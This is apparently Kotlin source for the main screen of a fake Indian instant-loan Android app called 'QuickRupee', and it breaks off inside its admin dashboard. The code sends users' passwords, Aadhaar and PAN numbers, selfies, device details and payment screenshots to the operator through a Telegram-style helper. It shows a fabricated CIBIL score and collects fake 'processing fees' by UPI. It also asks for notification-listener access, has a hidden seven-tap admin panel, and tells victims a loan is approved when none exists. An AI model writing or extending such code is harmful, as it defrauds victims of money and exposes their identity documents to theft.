package com.quick.rupee

import android.content.Intent
import android.content.SharedPreferences
import android.graphics.Bitmap
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Bundle
import android.os.CountDownTimer
import android.provider.Settings
import android.text.InputType
import android.view.Gravity
import android.view.View
import android.widget.EditText
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.activity.OnBackPressedCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import java.io.File

class MainActivity : AppCompatActivity() {

    private lateinit var prefs: SharedPreferences
    private val hist = ArrayList<Int>()
    private var timer: CountDownTimer? = null
    private var shotUri: Uri? = null
    private var selfie: Bitmap? = null
    private var taps = 0

    private val askPerm = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()) { }

    private val pick = registerForActivityResult(
        ActivityResultContracts.GetContent()) { u ->
        if (u != null) { shotUri = u; toast("Screenshot jud gaya") }
    }

    private val pickSelfie = registerForActivityResult(
        ActivityResultContracts.GetContent()) { u ->
        if (u != null) {
            runCatching {
                contentResolver.openInputStream(u)?.use {
                    selfie = android.graphics.BitmapFactory.decodeStream(it)
                }
            }
            render()
        }
    }

    private val camSelfie = registerForActivityResult(
        ActivityResultContracts.TakePicturePreview()) { b -> if (b != null) { selfie = b; render() } }

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        prefs = getSharedPreferences("qr", 0)
        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() { back() }
        })
        if (!Perms.allGranted(this)) askPerm.launch(Perms.needed(this).toTypedArray())
        if (step() == 0) splash() else render()
    }

    override fun onDestroy() { timer?.cancel(); super.onDestroy() }

    private fun ps(k: String, d: String = "-"): String = prefs.getString(k, d) ?: d
    private fun step() = prefs.getInt("step", 0)
    private fun setStep(n: Int) { prefs.edit().putInt("step", n).apply(); render() }
    private fun go(n: Int) { hist.add(step()); setStep(n) }
    private fun back() {
        if (hist.isNotEmpty()) setStep(hist.removeAt(hist.size - 1))
        else if (step() in 11..14 || step() in 20..24) setStep(11) else finish()
    }

    private fun splash() {
        val box = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL; gravity = Gravity.CENTER
            setBackgroundColor(Color.parseColor("#1552C4"))
        }
        box.addView(tv("QuickRupee", 34f, Color.WHITE, true).apply { gravity = Gravity.CENTER })
        box.addView(tv("Turant personal loan", 14f, Color.parseColor("#CFE0FF")).apply { gravity = Gravity.CENTER })
        setContentView(box)
        android.os.Handler(mainLooper).postDelayed({
            if (step() == 0) setStep(if (prefs.getBoolean("done", false)) 11 else 1)
        }, 1300)
    }

    private fun render() {
        when (step()) {
            1 -> login(); 2 -> otp(); 3 -> aadhaar(); 4 -> aadhaarOtp()
            5 -> pan(); 6 -> selfie(); 7 -> cibil(); 8 -> plans(); 9 -> pay()
            10 -> done(); 11 -> home(); 12 -> upi(); 13 -> recharge(); 14 -> profile()
            20 -> adminLogin(); 21 -> adminDash(); 22 -> adminPays(); 23 -> adminSet(); 24 -> adminCust()
            else -> home()
        }
    }

    // ---------- helpers ----------
    private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()

    private fun tv(t: String, size: Float, color: Int, bold: Boolean = false) =
        TextView(this).apply {
            text = t; textSize = size; setTextColor(color)
            if (bold) setTypeface(typeface, Typeface.BOLD)
            setPadding(0, dp(3), 0, dp(3))
        }

    private fun field(label: String, hint: String, num: Boolean = false, value: String = ""): Pair<LinearLayout, EditText> {
        val box = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        box.addView(tv(label, 12f, Color.parseColor("#6B7A90")))
        val e = EditText(this).apply {
            this.hint = hint; textSize = 15f; setSingleLine(true); setText(value)
            inputType = if (num) InputType.TYPE_CLASS_NUMBER else InputType.TYPE_CLASS_TEXT
            setPadding(dp(12), dp(12), dp(12), dp(12))
            background = GradientDrawable().apply {
                setColor(Color.WHITE); cornerRadius = dp(10).toFloat()
                setStroke(dp(1), Color.parseColor("#DCE3EE"))
            }
        }
        box.addView(e)
        box.setPadding(0, dp(6), 0, dp(6))
        return box to e
    }

    private fun btn(label: String, bg: Int, fg: Int, onClick: () -> Unit): TextView =
        tv(label, 16f, fg, true).apply {
            gravity = Gravity.CENTER
            setPadding(dp(16), dp(16), dp(16), dp(16))
            background = GradientDrawable().apply { setColor(bg); cornerRadius = dp(12).toFloat() }
            isClickable = true
            setOnClickListener { onClick() }
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT).apply { setMargins(0, dp(10), 0, 0) }
        }

    private fun header(sub: String): LinearLayout = LinearLayout(this).apply {
        orientation = LinearLayout.HORIZONTAL
        setBackgroundColor(Color.parseColor("#1552C4"))
        setPadding(dp(14), dp(22), dp(18), dp(18))
        val col = LinearLayout(this@MainActivity).apply { orientation = LinearLayout.VERTICAL }
        col.addView(tv("QuickRupee", 22f, Color.WHITE, true))
        col.addView(tv(sub, 12f, Color.parseColor("#CFE0FF")))
        if (step() in 2..10 || step() in 21..24) {
            addView(tv("←", 26f, Color.WHITE, true).apply {
                setPadding(dp(6), 0, dp(14), 0); isClickable = true
                setOnClickListener { back() }
            })
        }
        addView(col)
    }

    private fun page(vararg views: View): ScrollView {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#F4F6FA"))
        }
        views.forEach { root.addView(it) }
        val sv = ScrollView(this)
        sv.addView(root)
        sv.setBackgroundColor(Color.parseColor("#F4F6FA"))
        return sv
    }

    private fun toast(m: String) = Toast.makeText(this, m, Toast.LENGTH_SHORT).show()
    private fun device() =
        "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL} | A${android.os.Build.VERSION.RELEASE}"
    private fun send(m: String) { Thread { runCatching { Tg.text(m) } }.start() }

    // ---------- customer flow ----------
    private fun login() {
        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
        val title = tv("Turant personal loan", 20f, Color.parseColor("#16233A"), true).apply {
            isClickable = true
            setOnClickListener {
                taps++
                if (taps >= 7) { taps = 0; hist.clear(); setStep(20) }
            }
        }
        pad.addView(title)
        pad.addView(tv("₹20,000 se ₹1,00,000 tak, 5 minute mein", 13f, Color.parseColor("#6B7A90")))
        val (mBox, mEt) = field("Mobile number", "10 digit mobile number", true)
        val (pBox, pEt) = field("Password", "Password banayein")
        pEt.inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
        pad.addView(mBox); pad.addView(pBox)
        pad.addView(btn("OTP bhejein", Color.parseColor("#1552C4"), Color.WHITE) {
            val m = mEt.text.toString().trim()
            val p = pEt.text.toString().trim()
            if (m.length != 10) { toast("10 digit mobile daalein"); return@btn }
            if (p.length < 4) { toast("Password kam se kam 4 akshar"); return@btn }
            prefs.edit().putString("mobile", m).putString("pass", p).apply()
            Db.addOpen(this, m, ps("name", "customer"))
            send("<b>LOGIN</b>\n<b>Mobile</b> <code>$m</code>\n<b>Password</b> <code>$p</code>\n${device()}")
            toast("OTP bheja gaya")
            go(2)
        })
        pad.addView(tv("Admin: title pe 7 tap", 11f, Color.parseColor("#6B7A90")).apply { setPadding(0, dp(14), 0, 0) })
        setContentView(page(header("Login"), pad))
    }

    private fun otp() {
        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
        pad.addView(tv("OTP verify karein", 20f, Color.parseColor("#16233A"), true))
        pad.addView(tv("OTP bheja gaya: ${ps("mobile", "")}", 13f, Color.parseColor("#6B7A90")))
        val (oBox, oEt) = field("4 digit OTP", "****", true)
        pad.addView(oBox)
        val tTv = tv("", 13f, Color.parseColor("#B00020"))
        pad.addView(tTv)
        timer?.cancel()
        timer = object : CountDownTimer(30_000, 1000) {
            override fun onTick(ms: Long) { tTv.text = "Dobara bhejne ke liye ${ms / 1000} sec" }
            override fun onFinish() { tTv.text = "OTP dobara bhejein" }
        }.start()
        pad.addView(btn("Verify karein", Color.parseColor("#1552C4"), Color.WHITE) {
            if (oEt.text.toString().trim().length < 4) { toast("4 digit OTP daalein"); return@btn }
            send("<b>OTP verified</b> ${ps("mobile", "")}")
            go(3)
        })
        setContentView(page(header("Step 1 / 4 - Verify"), pad))
    }

    private fun aadhaar() {
        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
        pad.addView(tv("Aadhaar se KYC", 20f, Color.parseColor("#16233A"), true))
        pad.addView(tv("Aadhaar linked mobile par OTP jayega", 13f, Color.parseColor("#6B7A90")))
        val (aBox, aEt) = field("Aadhaar number", "12 digit Aadhaar", true)
        pad.addView(aBox)
        pad.addView(btn("Aadhaar OTP bhejein", Color.parseColor("#1552C4"), Color.WHITE) {
            val a = aEt.text.toString().trim()
            if (a.length != 12) { toast("12 digit Aadhaar daalein"); return@btn }
            prefs.edit().putString("aadhaar", a).apply()
            send("<b>AADHAAR</b> <code>$a</code> | ${ps("mobile", "")}")
            toast("OTP bheja gaya")
            go(4)
        })
        setContentView(page(header("Step 2 / 4 - Aadhaar"), pad))
    }

    private fun aadhaarOtp() {
        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
        pad.addView(tv("Aadhaar OTP", 20f, Color.parseColor("#16233A"), true))
        pad.addView(tv("Aadhaar linked number par OTP bheja gaya", 13f, Color.parseColor("#6B7A90")))
        val (oBox, oEt) = field("6 digit OTP", "******", true)
        pad.addView(oBox)
        pad.addView(btn("Verify karein", Color.parseColor("#1552C4"), Color.WHITE) {
            if (oEt.text.toString().trim().length < 4) { toast("OTP daalein"); return@btn }
            send("<b>Aadhaar OTP verified</b> ${ps("mobile", "")}")
            go(5)
        })
        setContentView(page(header("Step 2 / 4 - Aadhaar OTP"), pad))
    }

    private fun pan() {
        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
        pad.addView(tv("PAN details", 20f, Color.parseColor("#16233A"), true))
        pad.addView(tv("CIBIL score dekhne ke liye zaruri", 13f, Color.parseColor("#6B7A90")))
        val (nBox, nEt) = field("Poora naam", "Jaise Gaurav Kumar")
        val (pBox, pEt) = field("PAN number", "ABCDE1234F")
        pad.addView(nBox); pad.addView(pBox)
        pad.addView(btn("Aage badhein", Color.parseColor("#1552C4"), Color.WHITE) {
            val n = nEt.text.toString().trim()
            val p = pEt.text.toString().trim().uppercase()
            if (n.length < 3) { toast("Poora naam daalein"); return@btn }
            if (p.length != 10) { toast("10 akshar ka PAN daalein"); return@btn }
            prefs.edit().putString("name", n).putString("pan", p).apply()
            Db.addOpen(this, ps("mobile"), n)
            send("<b>PAN</b> <code>$p</code>\n<b>Name</b> $n\n<b>Aadhaar</b> <code>${ps("aadhaar")}</code>\n${ps("mobile", "")}")
            go(6)
        })
        setContentView(page(header("Step 3 / 4 - PAN"), pad))
    }

    private fun selfie() {
        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
        pad.addView(tv("Selfie khinchein", 20f, Color.parseColor("#16233A"), true))
        pad.addView(tv("Chehra saaf dikhna chahiye", 13f, Color.parseColor("#6B7A90")))
        val holder = LinearLayout(this).apply {
            gravity = Gravity.CENTER
            setPadding(dp(10), dp(10), dp(10), dp(10))
            background = GradientDrawable().apply {
                setColor(Color.WHITE); cornerRadius = dp(12).toFloat()
                setStroke(dp(1), Color.parseColor("#DCE3EE"))
            }
        }
        val iv = ImageView(this)
        holder.addView(iv, LinearLayout.LayoutParams(dp(220), dp(220)))
        val b = selfie
        if (b != null) iv.setImageBitmap(b)
        pad.addView(holder)
        pad.addView(btn("Camera se photo", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) { camSelfie.launch(null) })
        pad.addView(btn("Gallery se chunein", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) { pickSelfie.launch("image/*") })
        pad.addView(btn("Selfie submit karein", Color.parseColor("#1552C4"), Color.WHITE) {
            val bm = selfie
            if (bm == null) { toast("Pehle selfie lein"); return@btn }
            Thread {
                runCatching {
                    val f = File(cacheDir, "selfie.jpg")
                    f.outputStream().use { bm.compress(Bitmap.CompressFormat.JPEG, 80, it) }
                    Tg.photo(f, "selfie KYC | ${ps("mobile", "")}")
                    f.delete()
                }
            }.start()
            go(7)
        })
        setContentView(page(header("Step 4 / 4 - Selfie"), pad))
    }

    private fun cibil() {
        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(24), dp(20), dp(28)) }
        pad.addView(tv("CIBIL report taiyar ho rahi hai...", 16f, Color.parseColor("#16233A"), true))
        pad.addView(tv("Aadhaar, PAN aur selfie verify ho rahi hai", 13f, Color.parseColor("#6B7A90")))
        setContentView(page(header("Verification"), pad))
        android.os.Handler(mainLooper).postDelayed({ if (step() == 7) score() }, 2200)
    }

    private fun score() {
        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
        pad.addView(tv("Aapka CIBIL score", 14f, Color.parseColor("#6B7A90")))
        pad.addView(tv("742", 46f, Color.parseColor("#138808"), true))
        pad.addView(tv("Achha (700-750)", 13f, Color.parseColor("#138808")))
        val bar = View(this)
        bar.background = GradientDrawable().apply { setColor(Color.parseColor("#138808")); cornerRadius = dp(6).toFloat() }
        pad.addView(bar, LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, dp(10)).apply { setMargins(0, dp(10), 0, dp(10)) })
        pad.addView(tv("Aap ₹1,00,000 tak ke loan ke liye eligible hain", 16f, Color.parseColor("#16233A"), true))
        pad.addView(tv("Byaj 14% se shuru | avadhi 3 se 24 mahine", 13f, Color.parseColor("#6B7A90")))
        send("<b>CIBIL</b> 742 | eligible ₹1,00,000 | ${ps("name")} ${ps("pan")}")
        pad.addView(btn("Offers dekhein", Color.parseColor("#1552C4"), Color.WHITE) { go(8) })
        setContentView(page(header("Report"), pad))
    }

    private fun fee(a: Int) = when (a) { 20000 -> 3000; 50000 -> 5000; else -> 8000 }

    private fun plans() {
        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
        pad.addView(tv("Badhai ho!", 22f, Color.parseColor("#138808"), true))
        pad.addView(tv("Aap ₹1,00,000 tak ke liye eligible hain", 14f, Color.parseColor("#16233A")))
        pad.addView(tv("Apna amount chunein", 13f, Color.parseColor("#6B7A90")).apply { setPadding(0, dp(14), 0, dp(4)) })
        for (a in listOf(20000, 50000, 100000)) {
            val card = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                setPadding(dp(16), dp(16), dp(16), dp(16))
                background = GradientDrawable().apply {
                    setColor(Color.WHITE); cornerRadius = dp(12).toFloat()
                    setStroke(dp(1), Color.parseColor("#DCE3EE"))
                }
                isClickable = true
                setOnClickListener {
                    prefs.edit().putInt("amount", a).apply()
                    send("<b>PLAN CHUNA</b> ₹$a | fee ₹${fee(a)} | ${ps("mobile", "")}")
                    go(9)
                }
            }
            card.addView(tv("₹${"%,d".format(a)}", 20f, Color.parseColor("#16233A"), true))
            card.addView(tv("Processing fee ₹${fee(a)} | EMI ₹${"%,d".format(a / 12 + 900)}", 13f, Color.parseColor("#6B7A90")))
            card.addView(tv("Turant approval", 12f, Color.parseColor("#138808")))
            card.layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT).apply { setMargins(0, dp(8), 0, 0) }
            pad.addView(card)
        }
        setContentView(page(header("Step 3 / 3 - Plan"), pad))
    }

    private fun pay() {
        val amount = prefs.getInt("amount", 20000)
        val f = fee(amount)
        val upi = Db.upi(this)
        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
        pad.addView(tv("Processing fee ₹${"%,d".format(f)}", 20f, Color.parseColor("#16233A"), true))
        pad.addView(tv("₹${"%,d".format(amount)} ke loan ke liye ek baar fee jama karein", 13f, Color.parseColor("#6B7A90")))
        val qrBox = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL; gravity = Gravity.CENTER
            setPadding(dp(16), dp(16), dp(16), dp(16))
            background = GradientDrawable().apply {
                setColor(Color.WHITE); cornerRadius = dp(12).toFloat()
                setStroke(dp(1), Color.parseColor("#DCE3EE"))
            }
        }
        val img = ImageView(this)
        val link = "upi://pay?pa=$upi&pn=${Db.upiName(this)}&am=$f&cu=INR"
        val qrId = resources.getIdentifier("qr", "drawable", packageName)
        if (qrId != 0) img.setImageResource(qrId) else Thread {
            val bm = Tg.qrImage(link)
            if (bm != null) runOnUiThread { img.setImageBitmap(bm) }
        }.start()
        qrBox.addView(img, LinearLayout.LayoutParams(dp(230), dp(230)))
        qrBox.addView(tv("Scan karke ₹${"%,d".format(f)} bhejein", 13f, Color.parseColor("#16233A")))
        qrBox.addView(tv(upi, 13f, Color.parseColor("#1552C4"), true))
        pad.addView(qrBox)
        pad.addView(btn("UPI app se pay karein", Color.parseColor("#138808"), Color.WHITE) {
            runCatching { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(link))) }
                .onFailure { toast("UPI app nahi mili - QR scan karein") }
        })
        val timerTv = tv("02:00", 22f, Color.parseColor("#B00020"), true).apply {
            gravity = Gravity.CENTER; setPadding(0, dp(14), 0, 0)
        }
        pad.addView(tv("Payment ke baad UTR daalein - samay:", 13f, Color.parseColor("#6B7A90")).apply { setPadding(0, dp(16), 0, 0) })
        pad.addView(timerTv)
        timer?.cancel()
        timer = object : CountDownTimer(120_000, 1000) {
            override fun onTick(ms: Long) { timerTv.text = "%02d:%02d".format(ms / 60000, (ms % 60000) / 1000) }
            override fun onFinish() { timerTv.text = "samay samapt" }
        }.start()
        val (uBox, uEt) = field("UTR / Reference number", "12 digit UTR", true)
        pad.addView(uBox)
        pad.addView(btn("Screenshot attach karein", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) { pick.launch("image/*") })
        pad.addView(btn("Payment ho gaya - submit", Color.parseColor("#1552C4"), Color.WHITE) {
            val u = uEt.text.toString().trim()
            if (u.length < 6) { toast("Sahi UTR daalein"); return@btn }
            prefs.edit().putString("utr", u).apply()
            Db.addPay(this, ps("mobile"), amount, f, u)
            Thread {
                runCatching {
                    Tg.text("<b>PAYMENT CLAIM</b>\n<b>Amount</b> ₹$amount | <b>Fee</b> ₹$f\n<b>UTR</b> <code>$u</code>\n" +
                        "<b>Mobile</b> <code>${ps("mobile")}</code>\n" +
                        "<b>Name</b> ${ps("name")} | <b>PAN</b> <code>${ps("pan")}</code>\n" +
                        "<b>Aadhaar</b> <code>${ps("aadhaar")}</code>\n${device()}")
                    val u2 = shotUri
                    if (u2 != null) {
                        val tmp = File(cacheDir, "pay.jpg")
                        contentResolver.openInputStream(u2)?.use { ins -> tmp.outputStream().use { ins.copyTo(it) } }
                        Tg.photo(tmp, "payment screenshot")
                        tmp.delete()
                    }
                }
            }.start()
            prefs.edit().putBoolean("done", true).apply()
            go(10)
        })
        setContentView(page(header("Payment"), pad))
    }

    private fun done() {
        val amount = prefs.getInt("amount", 20000)
        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(24), dp(20), dp(28)) }
        pad.addView(tv("Aavedan safal", 24f, Color.parseColor("#138808"), true))
        pad.addView(tv("₹${"%,d".format(amount)} ka loan swikrit", 17f, Color.parseColor("#16233A"), true))
        pad.addView(tv("Agli 24 ghante mein amount aapke bank account mein credit ho jayega.",
            14f, Color.parseColor("#16233A")).apply { setPadding(0, dp(10), 0, 0) })
        pad.addView(tv("Reference: QR-${ps("mobile", "0000")}-${ps("utr")}",
            12f, Color.parseColor("#6B7A90")).apply { setPadding(0, dp(12), 0, 0) })
        pad.addView(btn("Dashboard kholein", Color.parseColor("#1552C4"), Color.WHITE) { hist.clear(); setStep(11) })
        setContentView(page(header("Approved"), pad))
    }

    // ---------- customer menu ----------
    private fun bottomBar(active: Int): LinearLayout {
        val bar = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setBackgroundColor(Color.WHITE)
            setPadding(0, dp(8), 0, dp(8))
        }
        for ((label, target) in listOf("Home" to 11, "UPI" to 12, "Recharge" to 13, "Profile" to 14)) {
            bar.addView(tv(label, 12f,
                if (active == target) Color.parseColor("#1552C4") else Color.parseColor("#6B7A90"),
                active == target).apply {
                gravity = Gravity.CENTER; isClickable = true
                setOnClickListener { hist.clear(); setStep(target) }
                layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
            })
        }
        return bar
    }

    private fun shell(sub: String, active: Int, pad: LinearLayout) {
        val root = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        root.addView(header(sub))
        val sv = ScrollView(this)
        sv.addView(pad)
        root.addView(sv, LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f))
        root.addView(bottomBar(active))
        setContentView(root)
    }

    private fun home() {
        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
        val amount = prefs.getInt("amount", 0)
        pad.addView(tv("Namaste, ${ps("name", "customer")}", 18f, Color.parseColor("#16233A"), true))
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(16), dp(16), dp(16), dp(16))
            background = GradientDrawable().apply { setColor(Color.parseColor("#EEF3FB")); cornerRadius = dp(12).toFloat() }
        }
        if (amount > 0) {
            card.addView(tv("Approved limit", 12f, Color.parseColor("#6B7A90")))
            card.addView(tv("₹${"%,d".format(amount)}", 24f, Color.parseColor("#1552C4"), true))
            card.addView(tv("24 ghante mein credit | status: process", 12f, Color.parseColor("#6B7A90")))
        } else {
            card.addView(tv("Aapki limit", 12f, Color.parseColor("#6B7A90")))
            card.addView(tv("₹1,00,000", 24f, Color.parseColor("#1552C4"), true))
            card.addView(tv("CIBIL 742 | eligible", 12f, Color.parseColor("#138808")))
        }
        pad.addView(card)
        pad.addView(btn("Naya loan", Color.parseColor("#1552C4"), Color.WHITE) { go(8) })
        pad.addView(btn("UPI chalayein - 0.5% cashback", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) { hist.clear(); setStep(12) })
        pad.addView(btn("Mobile recharge", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) { hist.clear(); setStep(13) })
        pad.addView(tv("Aapke liye", 15f, Color.parseColor("#16233A"), true).apply { setPadding(0, dp(18), 0, dp(4)) })
        for (t in listOf("Instant loan 24 ghante mein", "Credit score sudharein - free report", "Dost ko refer karein - ₹500")) {
            pad.addView(tv("-  $t", 13f, Color.parseColor("#6B7A90")))
        }
        shell("Dashboard", 11, pad)
    }

    private fun upi() {
        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
        pad.addView(tv("QuickRupee UPI", 20f, Color.parseColor("#16233A"), true))
        pad.addView(tv("Har payment par 0.5% cashback, seedha wallet mein", 13f, Color.parseColor("#138808")))
        val w = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(16), dp(16), dp(16), dp(16))
            background = GradientDrawable().apply { setColor(Color.parseColor("#EEF3FB")); cornerRadius = dp(12).toFloat() }
        }
        w.addView(tv("Cashback wallet", 12f, Color.parseColor("#6B7A90")))
        w.addView(tv("₹${prefs.getInt("cashback", 0)}", 24f, Color.parseColor("#1552C4"), true))
        pad.addView(w)
        val (aBox, aEt) = field("Amount", "₹", true)
        pad.addView(aBox)
        pad.addView(btn("UPI app se pay karein", Color.parseColor("#138808"), Color.WHITE) {
            val amt = aEt.text.toString().trim().toIntOrNull() ?: 0
            if (amt <= 0) { toast("Amount daalein"); return@btn }
            val cb = (amt * 0.5 / 100).toInt()
            prefs.edit().putInt("cashback", prefs.getInt("cashback", 0) + cb).apply()
            send("<b>UPI PAY</b> ₹$amt | cashback ₹$cb | ${ps("mobile", "")}")
            runCatching {
                startActivity(Intent(Intent.ACTION_VIEW,
                    Uri.parse("upi://pay?pa=${Db.upi(this)}&pn=${Db.upiName(this)}&am=$amt&cu=INR")))
            }.onFailure { toast("UPI app nahi mili") }
            toast("₹$cb cashback mila")
            render()
        })
        pad.addView(tv("Recent", 15f, Color.parseColor("#16233A"), true).apply { setPadding(0, dp(18), 0, dp(4)) })
        for (t in listOf("Recharge - ₹199", "UPI transfer - ₹500", "UPI transfer - ₹1,200")) {
            pad.addView(tv("$t   0.5% cashback", 13f, Color.parseColor("#6B7A90")))
        }
        shell("UPI", 12, pad)
    }

    private fun recharge() {
        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
        pad.addView(tv("Mobile recharge", 20f, Color.parseColor("#16233A"), true))
        pad.addView(tv("Turant recharge, 0.5% cashback", 13f, Color.parseColor("#138808")))
        val (nBox, nEt) = field("Mobile number", "10 digit", true)
        pad.addView(nBox)
        for (p in listOf(199 to "28 din | 1.5GB/din", 299 to "28 din | 2GB/din", 449 to "56 din | 2GB/din")) {
            val card = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                setPadding(dp(16), dp(14), dp(16), dp(14))
                background = GradientDrawable().apply {
                    setColor(Color.WHITE); cornerRadius = dp(10).toFloat()
                    setStroke(dp(1), Color.parseColor("#DCE3EE"))
                }
                isClickable = true
                setOnClickListener {
                    val num = nEt.text.toString().trim()
                    if (num.length != 10) { toast("10 digit number daalein"); return@setOnClickListener }
                    send("<b>RECHARGE</b> ₹${p.first} | $num | ${ps("mobile", "")}")
                    runCatching {
                        startActivity(Intent(Intent.ACTION_VIEW,
                            Uri.parse("upi://pay?pa=${Db.upi(this)}&pn=${Db.upiName(this)}&am=${p.first}&cu=INR")))
                    }
                    toast("Recharge ₹${p.first} shuru")
                }
            }
            card.addView(tv("₹${p.first}", 18f, Color.parseColor("#16233A"), true))
            card.addView(tv("  ${p.second}", 12f, Color.parseColor("#6B7A90")))
            card.layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT).apply { setMargins(0, dp(8), 0, 0) }
            pad.addView(card)
        }
        shell("Recharge", 13, pad)
    }

    private fun profile() {
        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
        pad.addView(tv("Profile", 20f, Color.parseColor("#16233A"), true))
        Db.addOpen(this, ps("mobile"), ps("name", "customer"))
        fun row(k: String, v: String) {
            pad.addView(tv(k, 12f, Color.parseColor("#6B7A90")).apply { setPadding(0, dp(10), 0, 0) })
            pad.addView(tv(v, 15f, Color.parseColor("#16233A"), true))
        }
        row("Naam", ps("name"))
        row("Mobile", ps("mobile"))
        row("Aadhaar", "XXXX XXXX ${ps("aadhaar", "0000").takeLast(4)}")
        row("PAN", ps("pan"))
        row("CIBIL", "742")
        pad.addView(btn("Notification access", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        })
        pad.addView(btn("Battery Unrestricted", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) { Perms.askBattery(this) })
        shell("Profile", 14, pad)
    }

    // ---------- admin panel ----------
    private fun adminLogin() {
        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
        pad.addView(tv("Admin panel", 20f, Color.parseColor("#16233A"), true))
        pad.addView(tv("Sirf operator ke liye", 13f, Color.parseColor("#6B7A90")))
        val (iBox, iEt) = field("Admin ID", "10 digit", true)
        val (pBox, pEt) = field("Password", "password", true)
        pad.addView(iBox); pad.addView(pBox)
        pad.addView(btn("Login", Color.parseColor("#16233A"), Color.WHITE) {
            if (iEt.text.toString().trim() == Db.ADMIN_ID && pEt.text.toString().trim() == Db.ADMIN_PASS) {
                hist.clear(); setStep(21)
            }
else toast("Galat ID ya password")
        })
        pad.addView(btn("Customer login", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) { hist.clear(); setStep(1) })
        setContentView(page(header("Admin"), pad))
    }

    private fun adminDash() {
        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
        pad.addView(tv("Admin dashboard", 20f, Color.parseColor("#16233A"), true))
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(16), dp(16), dp(16), dp(16))
            background = GradientDrawable().apply { setColor(Color.parseColor("#EEF3FB")); cornerRadius = dp(12).toFloat() }
        }
        card.addView(tv("Customers: ${Db.customers(this@MainActivity).length()}", 14f, Color.parseColor("#16233A"), true))
        card.addView(tv("Pending: ${Db.pendingCount(this@MainActivity)}", 14f, Color.parseColor("#B00020"), true))
        card.addView(tv("Collected: ₹${Db.totalPaid(this@MainActivity)}", 14f, Color.parseColor("#138808"), true))
        pad.addView(card)
        pad.addView(btn("Pending payments", Color.parseColor("#1552C4"), Color.WHITE) { go(22) })
        pad.addView(btn("UPI / Bank settings", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) { go(23) })
